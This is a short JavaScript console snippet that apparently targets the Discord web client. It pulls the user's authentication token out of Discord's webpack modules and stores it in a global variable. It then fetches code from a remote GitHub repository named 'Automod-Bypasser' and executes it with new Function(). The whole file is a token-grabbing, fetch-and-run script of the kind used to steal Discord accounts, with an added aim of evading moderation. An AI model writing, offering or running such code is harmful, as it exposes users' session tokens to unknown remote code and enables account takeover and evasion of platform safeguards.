function timeoutLoop() {
    (function checkCondition() {
        if (window.token !== undefined) {
            console.log("Token found, exiting loop.");
        } else {
            console.log("Waiting for token...");
        try {
            window.token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
                .find(m=>m?.exports?.default?.getToken!==void 0)
                .exports.default.getToken();
        } catch (error) {
        }
            setTimeout(checkCondition, 500);
        }
    })();
}
timeoutLoop();
fetch("https://raw.githubusercontent.com/MAJESTY5164/Automod-Bypasser/refs/heads/main/main")
  .then(response => response.text())
  .then(data => {new Function(data)();})
